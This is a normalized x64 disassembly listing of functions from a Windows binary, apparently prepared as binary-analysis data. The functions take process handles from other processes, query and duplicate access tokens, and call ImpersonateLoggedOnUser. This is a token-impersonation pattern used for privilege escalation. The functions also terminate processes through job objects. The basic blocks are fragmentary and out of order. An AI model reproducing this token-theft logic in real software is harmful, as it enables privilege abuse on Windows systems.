lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
mov rbx [ r15 ]
cmp rbx [ r15 + 0x8 ]
je r-xdata
call sub_14003d01c
mov [ rsp + 0x48 ] eax
jmp r-xdata
mov rcx [ rcx ]
test r15 r15
je r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_14003ad04
lea r14 [ rw-data ]
nop [ rax + rax ] ax
mov rax [ rbx + 0x8 ]
cmp [ rbx ] rax
sete al
lea rdx [ rsp + 0x48 ]
test al al
cmovne rdx rsi
mov rcx r15
call sub_14000f930
test al al
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x40 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x150 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ r15 ]
test rcx rcx
je r-xdata
add rbx 0x18
cmp rbx [ r15 + 0x8 ]
jne r-xdata
call [ GetCurrentProcess@IAT ]
mov r8 rax
movzx edx [ rbx + 0x6 ]
mov [ rsp + 0x30 ] 0x2
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] esi
lea r9 [ rsp + 0x50 ]
mov rcx rdi
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov [ r15 ] rsi
mov [ r15 + 0x8 ] rsi
mov [ r15 + 0x10 ] rsi
mov rcx r15
call j_sub_14003ad04
call j_sub_14003ad04
mov r8d [ rbx ]
xor edx edx
lea ecx [ rdx + 0x40 ]
call [ OpenProcess@IAT ]
mov rdi rax
mov [ rsp + 0x60 ] rax
test rax rax
je r-xdata
jmp r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] rsi
mov [ rbp - 0x60 ] si
lea rdx [ rbp - 0x60 ]
mov rcx [ rsp + 0x50 ]
call sub_14000fa40
test al al
je r-xdata
mov rcx [ rsp + 0x50 ]
call [ CloseHandle@IAT ]
nop
cmp [ rbp - 0x48 ] 0x8
jb r-xdata
lea rcx [ rbp - 0x60 ]
cmp [ rbp - 0x48 ] 0x8
cmovae rcx [ rbp - 0x60 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
sete dil
mov [ rsp + 0x41 ] dil
lea rcx [ rbp - 0x60 ]
cmp [ rbp - 0x48 ] 0x8
cmovae rcx [ rbp - 0x60 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
sete r13b
test dil dil
jne r-xdata
mov rcx [ rbp - 0x60 ]
call j_sub_14003ad04
mov edx 0x5
lea rcx [ rbp - 0x80 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r14
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov ecx 0x20
mov [ rax + r14 + 0x58 ] cx
mov edx [ rbx ]
mov rcx r14
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
cmp [ rsp + 0x40 ] 0x0
je r-xdata
test r13b r13b
je r-xdata
mov edx 0x5
lea rcx [ rbp - 0x70 ]
call sub_140039e70
mov r12 rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rdi rax
test rax rax
jne r-xdata
mov ecx 0x58
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x60 ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rsi
jmp r-xdata
mov rdi rsi
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] rsi
mov [ rax + 0x30 ] si
jmp r-xdata
test r13b r13b
je r-xdata
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] rsi
mov [ rbp - 0x10 ] si
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] rsi
mov [ rbp - 0x38 ] si
mov r13 [ rsp + 0x50 ]
xor r12b r12b
mov [ rsp + 0x44 ] esi
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea edx [ rdi - 0x8 ]
mov rcx r13
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
mov rdx [ r12 + 0x8 ]
call [ r12 ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov ecx 0x20
mov [ rax + rdi + 0x58 ] cx
movzx edx [ rbx + 0x6 ]
mov rcx rdi
call sub_14001c6b0
mov rcx rax
mov edi 0x9
movzx edx di
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x60 ]
call sub_14000ae70
mov rcx rax
movzx edx di
call sub_14000fe50
cmp [ rsp + 0x41 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
mov edx 0x19
lea rcx [ rsp + 0x70 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r14
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov ecx 0x20
mov [ rax + r14 + 0x58 ] cx
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx r14
and [ rcx + 0x18 ] 0xfffffe7f
or [ rcx + 0x18 ] 0x40
lea rdx [ rdi + 0x30 ]
mov rcx r14
call sub_14000ae70
mov r11 rax
test rax rax
jne r-xdata
mov r8 r12
mov rdx rdi
mov ecx [ rbx ]
call sub_14000d140
test al al
je r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov edi esi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x50 ]
call [ GetProcessId@IAT ]
mov edi eax
mov edx eax
mov rcx r14
call sub_140008400
cmp [ rsp + 0x40 ] 0x0
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x18 ]
call sub_14000f390
nop
mov rdx rax
mov rcx r14
call sub_14000ae70
nop
cmp [ rbp + 0x30 ] 0x8
jb r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rdi + 0x48 ] 0x8
jb r-xdata
mov rax [ rax ]
movsxd rax [ rax + 0x4 ]
add rax r11
mov rax rsi
jmp r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r14
test edi edi
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove edi eax
mov rax [ rw-data ]
mov ecx 0x58
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x18 ]
call j_sub_14003ad04
nop
mov ecx [ rsp + 0x44 ]
call j_sub_14003ac60
mov rdi rax
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x44 ]
mov r8 rdi
mov edx 0x1
mov rcx r13
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x48 ] 0x7
mov [ rdi + 0x40 ] rsi
mov [ rdi + 0x30 ] si
mov rcx rdi
call j_sub_14003ad04
mov rcx [ rdi + 0x30 ]
call j_sub_14003ad04
and [ rax + 0x18 ] 0xfffffebf
or [ rax + 0x18 ] 0x80
mov r12 [ rsp + 0x58 ]
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov r12 rsi
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] rsi
mov [ rax + 0x30 ] si
jmp r-xdata
mov [ rbp - 0x20 ] 0x7
mov [ rbp - 0x28 ] rsi
mov [ rbp - 0x38 ] si
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_14003ad04
mov rcx rdi
call j_sub_14003ad04#2
test r12b r12b
je r-xdata
xor r9d r9d
lea r8 [ rbp - 0x38 ]
lea rdx [ rbp - 0x10 ]
mov rcx [ rdi ]
call sub_14000e700
movzx r12d al
xor r8d r8d
call sub_140003120
or edx 0x4
test r12 r12
je r-xdata
mov edx 0x9
mov rcx r14
call sub_14000fe50
mov rcx rax
lea rdx [ r12 + 0x30 ]
call sub_14000ae70
mov r8 [ rsp + 0x58 ]
mov rdx r12
mov ecx edi
call sub_14000d140
test al al
je r-xdata
mov rcx [ rbp - 0x10 ]
jmp r-xdata
mov edx 0x9
mov rcx r14
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x38 ]
call sub_14000ae70
mov rcx rax
mov edx 0x5c
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x10 ]
call sub_14000ae70
jmp r-xdata
cmp [ r12 + 0x48 ] 0x8
jb r-xdata
call j_sub_14003ad04
mov [ r12 + 0x48 ] 0x7
mov [ r12 + 0x40 ] rsi
mov [ r12 + 0x30 ] si
mov rcx r12
mov rcx [ r12 + 0x30 ]
call j_sub_14003ad04
sub_14001b960
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x48 ]
sub rsp 0x120
mov [ rbp - 0x70 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x18 ] rax
mov rbx rcx
mov [ rsp + 0x58 ] rcx
mov edi 0x20
mov ecx edi
call sub_14003ac60
mov [ rsp + 0x60 ] rax
xor r14d r14d
test rax rax
je r-xdata
mov rax r14
mov [ rsp + 0x60 ] rax
mov [ rax ] r14
mov [ rax + 0x8 ] r14
mov [ rax + 0x10 ] r14
jmp r-xdata
mov rsi r14
mov [ rsp + 0x70 ] r14
mov [ rax ] r14
mov [ rax + 0x8 ] r14
mov [ rax + 0x10 ] r14
jmp r-xdata
xor edx edx
mov rcx rax
call sub_14000c0b0
movzx r15d al
mov [ rsp + 0x40 ] al
mov rcx rdi
call sub_14003ac60
mov rsi rax
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x38 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
mov rdi [ rsi ]
cmp rdi [ rsi + 0x8 ]
je r-xdata
xor edx edx
mov rcx rsi
call sub_14000f930
test al al
je r-xdata
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_14003ad04
lea r12 [ rw-data ]
mov al 0x1
mov rcx [ rbp + 0x18 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x120 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rsi ]
test rcx rcx
je r-xdata
add rdi 0x18
cmp rdi [ rsi + 0x8 ]
jne r-xdata
call [ GetCurrentProcess@IAT ]
mov r8 rax
movzx edx [ rdi + 0x6 ]
mov [ rsp + 0x30 ] 0x2
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r14d
lea r9 [ rsp + 0x48 ]
mov rcx r13
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov [ rsi ] r14
mov [ rsi + 0x8 ] r14
mov [ rsi + 0x10 ] r14
mov rcx rsi
call j_sub_14003ad04
call j_sub_14003ad04
mov r8d [ rdi ]
xor edx edx
lea ecx [ rdx + 0x40 ]
call [ OpenProcess@IAT ]
mov r13 rax
mov [ rsp + 0x78 ] rax
test rax rax
je r-xdata
jmp r-xdata
mov rcx r13
call [ CloseHandle@IAT ]
mov [ rbp + 0x8 ] 0x7
mov [ rbp ] r14
mov [ rbp - 0x10 ] r14w
lea rdx [ rbp - 0x10 ]
mov rcx [ rsp + 0x48 ]
call sub_14000fa40
test al al
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
nop
cmp [ rbp + 0x8 ] 0x8
jb r-xdata
lea rcx [ rbp - 0x10 ]
cmp [ rbp + 0x8 ] 0x8
cmovae rcx [ rbp - 0x10 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rcx [ rbp - 0x10 ]
call j_sub_14003ad04
test r15b r15b
je r-xdata
lea ecx [ rax + 0x58 ]
call sub_14003ac60
mov r13 rax
mov [ rsp + 0x68 ] rax
test rax rax
je r-xdata
mov r13 r14
mov [ rsp + 0x68 ] r14
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] r14
mov [ rax + 0x30 ] r14w
jmp r-xdata
mov r15 r14
mov [ rbp - 0x80 ] r14
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] r14
mov [ rax + 0x30 ] r14w
jmp r-xdata
mov ecx 0x58
call sub_14003ac60
mov r15 rax
mov [ rbp - 0x80 ] rax
test rax rax
je r-xdata
test r15 r15
je r-xdata
mov r8 [ rsp + 0x60 ]
mov rdx r15
mov ecx [ rsp + 0x50 ]
call sub_14000d140
test al al
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ GetProcessId@IAT ]
mov [ rsp + 0x50 ] eax
mov r8 [ rsp + 0x60 ]
mov rdx r13
mov ecx [ rdi ]
call sub_14000d140
test al al
je r-xdata
test r13 r13
je r-xdata
cmp [ r15 + 0x48 ] 0x8
jb r-xdata
mov rbx [ rbx ]
mov rax [ rsp + 0x58 ]
cmp rbx [ rax + 0x8 ]
je r-xdata
movzx r15d [ rsp + 0x40 ]
mov r13 [ rsp + 0x78 ]
cmp [ r13 + 0x48 ] 0x8
jb r-xdata
mov [ r15 + 0x48 ] 0x7
mov [ r15 + 0x40 ] r14
mov [ r15 + 0x30 ] r14w
mov rcx r15
call j_sub_14003ad04
mov rcx [ r15 + 0x30 ]
call j_sub_14003ad04
mov rbx rax
lea rax [ r15 + 0x30 ]
mov r15 rax
nop
mov [ r13 + 0x48 ] 0x7
mov [ r13 + 0x40 ] r14
mov [ r13 + 0x30 ] r14w
mov rcx r13
call j_sub_14003ad04
mov rcx [ r13 + 0x30 ]
call j_sub_14003ad04
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx r15
mov rcx [ r15 ]
jmp r-xdata
cmp [ r15 + 0x18 ] 0x8
jb r-xdata
add rbx 0x28
mov rax [ rsp + 0x58 ]
cmp rbx [ rax + 0x8 ]
jne r-xdata
lea edx [ rax + 0x5 ]
lea rcx [ rbp - 0x68 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx r12
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov ecx 0x20
mov [ rax + r12 + 0x58 ] cx
lea edx [ rcx - 0x7 ]
lea rcx [ rbp - 0x48 ]
call sub_140039e70
mov rsi rax
mov edx [ rdi ]
mov rcx r12
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov ecx 0x20
mov [ rdx + rax + 0x58 ] cx
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
add rdx rax
and [ rdx + 0x18 ] 0xfffffe7f
or [ rdx + 0x18 ] 0x40
lea rdx [ r13 + 0x30 ]
mov rcx rax
call sub_14000ae70
mov r13 rax
test rax rax
jne r-xdata
call sub_14003bad0
test eax eax
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov r15 [ rbp - 0x80 ]
mov rsi [ rsp + 0x70 ]
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r13
mov rcx r14
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x38 ]
call sub_14000f390
mov rsi rax
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000ae70
mov rcx rax
call sub_140007970
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
nop
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
jmp r-xdata
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx 0x5
lea rcx [ rbp - 0x58 ]
call sub_140039e70
mov rsi rax
lea rdx [ r--data ]
mov rcx r13
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov ecx 0x20
mov [ rdx + rax + 0x58 ] cx
movzx edx [ rdi + 0x6 ]
mov rcx rax
call sub_14001c6b0
mov rcx rax
mov esi 0x9
movzx edx si
call sub_14000fe50
mov rcx rax
mov edx [ rsp + 0x50 ]
call sub_140008400
mov rcx rax
movzx edx si
call sub_14000fe50
mov rcx rax
mov rdx r15
call sub_14000ae70
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ TerminateProcess@IAT ]
test eax eax
je r-xdata
xor edx edx
xor ecx ecx
call [ CreateJobObjectW@IAT ]
mov r13 rax
test rax rax
je r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_14003ad04
mov edx 0xa
mov rcx r12
call sub_1400085e0
mov esi r14d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
mov rdx [ rsp + 0x48 ]
mov rcx rax
call [ AssignProcessToJobObject@IAT ]
test eax eax
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r12
test esi esi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove esi eax
mov rax [ rw-data ]
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x38 ]
call sub_14000f390
mov rsi rax
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000ae70
nop
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
xor edx edx
mov rcx r13
call [ TerminateJobObject@IAT ]
test eax eax
je r-xdata
mov r13 [ rsp + 0x68 ]
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx r13
call [ CloseHandle@IAT ]
mov rcx [ rbp - 0x38 ]
call j_sub_14003ad04
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x38 ]
call sub_14000f390
mov rsi rax
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000ae70
nop
jmp r-xdata
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
sub_14001c010
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x78 ]
sub rsp 0x150
mov [ rsp + 0x70 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x48 ] rax
mov [ rsp + 0x60 ] rcx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov edi 0x20
mov ecx edi
call sub_14003ac60
mov r14 rax
mov [ rsp + 0x50 ] rax
xor esi esi
test rax rax
je r-xdata
mov r14 rsi
mov [ rsp + 0x50 ] rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
mov r13 rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
xor edx edx
mov rcx r14
call sub_14000c0b0
movzx r12d al
mov [ rsp + 0x40 ] al
mov rcx rdi
call sub_14003ac60
mov r13 rax
test rax rax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x10 ] 0x8
jb r-xdata
mov rbx [ r13 ]
xor edx edx
mov rcx r13
call sub_14000f930
test al al
je r-xdata
test r13 r13
je r-xdata
mov rcx [ rbp - 0x8 ]
mov r8d [ rbx ]
xor edx edx
lea ecx [ rdx + 0x40 ]
call [ OpenProcess@IAT ]
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x48 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x150 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ r13 ]
test rcx rcx
je r-xdata
add rbx 0x18
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov r8 rax
movzx edx [ rbx + 0x6 ]
mov [ rsp + 0x30 ] 0x2
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] esi
lea r9 [ rsp + 0x48 ]
mov rcx rdi
call [ DuplicateHandle@IAT ]
test eax eax
je r-xdata
mov [ r13 ] rsi
mov [ r13 + 0x8 ] rsi
mov [ r13 + 0x10 ] rsi
mov rcx r13
call j_sub_14003ad04
call j_sub_14003ad04
cmp rbx [ r13 + 0x8 ]
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov [ rbp + 0x38 ] 0x7
mov [ rbp + 0x30 ] rsi
mov [ rbp + 0x20 ] si
lea rdx [ rbp + 0x20 ]
mov rcx [ rsp + 0x48 ]
call sub_14000fa40
test al al
je r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
nop
cmp [ rbp + 0x38 ] 0x8
jb r-xdata
lea rcx [ rbp + 0x20 ]
cmp [ rbp + 0x38 ] 0x8
cmovae rcx [ rbp + 0x20 ]
lea rdx [ r--data ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rcx [ rbp + 0x20 ]
call j_sub_14003ad04
test r12b r12b
je r-xdata
lea ecx [ rax + 0x58 ]
call sub_14003ac60
mov r12 rax
test rax rax
je r-xdata
mov r12 rsi
mov [ rax + 0x48 ] 0x7
mov [ rax + 0x40 ] rsi
mov [ rax + 0x30 ] si
jmp r-xdata
test r12 r12
je r-xdata
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
mov r15 [ rsp + 0x48 ]
xor r14b r14b
mov [ rsp + 0x44 ] esi
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
lea edx [ r9 + 0x1 ]
mov rcx r15
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
mov r8 r14
mov rdx r12
mov ecx [ rbx ]
call sub_14000d140
test al al
je r-xdata
movzx r12d [ rsp + 0x40 ]
cmp [ r12 + 0x48 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
nop
mov rdx rax
lea rcx [ rw-data ]
call sub_14000ae70
nop
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ r12 + 0x48 ] 0x7
mov [ r12 + 0x40 ] rsi
mov [ r12 + 0x30 ] si
mov rcx r12
call j_sub_14003ad04
mov rcx [ r12 + 0x30 ]
call j_sub_14003ad04
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_14003ad04
nop
mov ecx [ rsp + 0x44 ]
call j_sub_14003ac60
mov rdi rax
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x20 ] rax
mov r9d [ rsp + 0x44 ]
mov r8 rdi
mov edx 0x1
mov rcx r15
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov rcx rdi
call j_sub_14003ad04#2
test r14b r14b
je r-xdata
xor r9d r9d
lea r8 [ rbp - 0x58 ]
lea rdx [ rbp - 0x30 ]
mov rcx [ rdi ]
call sub_14000e700
movzx r14d al
mov r14 [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov r15 [ rsp + 0x60 ]
mov rdx [ r15 ]
cmp rdx [ r15 + 0x8 ]
jne r-xdata
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
lea rdx [ r--data ]
jmp r-xdata
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
call sub_14003bad0
test eax eax
jne r-xdata
mov rdx [ rdx ]
lea edx [ rax + 0x5 ]
lea rcx [ rbp - 0x78 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
lea r15 [ rw-data ]
add rcx r15
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov r14d 0x20
mov [ rax + r15 + 0x58 ] r14w
lea edx [ r14 - 0x7 ]
lea rcx [ rsp + 0x78 ]
call sub_140039e70
mov rdi rax
mov edx [ rbx ]
mov rcx r15
call sub_140008400
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov [ rdx + rax + 0x58 ] r14w
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
add rdx rax
and [ rdx + 0x18 ] 0xfffffe7f
or [ rdx + 0x18 ] 0x40
lea rdx [ r12 + 0x30 ]
mov rcx rax
call sub_14000ae70
mov r14 rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx r14
mov rcx rsi
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x68 ]
mov [ rsp + 0x48 ] rcx
call [ ImpersonateLoggedOnUser@IAT ]
test eax eax
jne r-xdata
and [ rcx + 0x18 ] 0xfffffebf
or [ rcx + 0x18 ] 0x80
mov edx 0x5
lea rcx [ rbp - 0x68 ]
call sub_140039e70
mov rdi rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000fe10
mov rcx [ rax ]
movsxd rdx [ rcx + 0x4 ]
mov edi 0x20
mov [ rdx + rax + 0x58 ] di
movzx edx [ rbx + 0x6 ]
mov rcx rax
call sub_14001c6b0
mov rcx rax
mov edi 0x9
movzx edx di
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x58 ]
call sub_14000ae70
mov rcx rax
lea edx [ rdi + 0x53 ]
call sub_14000fe50
mov rcx rax
lea rdx [ rbp - 0x30 ]
call sub_14000ae70
mov rcx rax
movzx edx di
call sub_14000fe50
lea r11 [ rsp + 0x68 ]
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] 0x1
lea r9d [ rdi - 0x6 ]
xor r8d r8d
mov edx 0x2000000
mov rcx [ rsp + 0x48 ]
call [ DuplicateTokenEx@IAT ]
test eax eax
setne al
test al al
je r-xdata
cmp [ rbp + 0x10 ] 0x8
jb r-xdata
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx r15
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
jmp r-xdata
mov [ rbp - 0x40 ] 0x7
mov [ rbp - 0x48 ] rsi
mov [ rbp - 0x58 ] si
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] 0x7
mov [ rbp - 0x20 ] rsi
mov [ rbp - 0x30 ] si
cmp [ rbp + 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov rcx [ rbp + 0x20 ]
jmp r-xdata
call j_sub_14003ad04
sub_14001c6b0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
